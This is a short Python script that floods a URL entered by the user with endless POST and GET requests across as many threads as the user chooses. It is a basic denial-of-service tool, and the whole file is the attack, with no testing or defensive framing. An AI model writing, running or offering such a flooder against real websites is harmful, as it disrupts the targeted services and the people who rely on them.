import requests
from threading import *

url = input('Please enter your link : ')
streams = int(input('Please enter count streams : '))

def spam():
	while True:
		requests.post(url)
		requests.get(url)

for i in range(streams):
	Thread(target=spam).start()